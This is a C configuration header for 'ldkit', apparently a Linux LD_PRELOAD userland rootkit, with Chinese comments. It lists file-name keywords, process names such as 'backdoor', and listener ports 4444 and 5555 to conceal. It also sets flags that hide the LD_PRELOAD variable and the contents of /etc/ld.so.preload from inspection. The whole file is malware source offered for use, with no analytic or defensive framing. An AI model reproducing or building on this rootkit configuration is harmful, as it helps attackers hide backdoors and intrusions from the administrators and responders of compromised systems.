#ifndef LDKIT_CONFIG_H
#define LDKIT_CONFIG_H

/*
 * ldkit 配置文件
 * 在这里定义需要隐藏的文件、进程、网络连接
 */

/* 隐藏的文件名关键字列表（文件名包含这些字符串就会被隐藏） */
static const char* HIDDEN_FILES[] = {
    "hack",
    "fuck",
    "hidden",
    NULL  /* 结尾标记 */
};

/* 隐藏的进程名关键字列表（/proc/pid/cmdline 包含这些字符串就隐藏） */
static const char* HIDDEN_PROCS[] = {
    "ldkit",
    "backdoor",
    NULL
};

/* 隐藏的网络端口列表（本地端口匹配就隐藏） */
static const int HIDDEN_PORTS[] = {
    4444,
    5555,
    0  /* 结尾标记 */
};

/* 隐藏 LD_PRELOAD 环境变量自身（防止被 env/printenv 发现） */
#define HIDE_LD_PRELOAD 1

/* 隐藏 /etc/ld.so.preload 文件内容 */
#define HIDE_PRELOAD_FILE 1

#endif
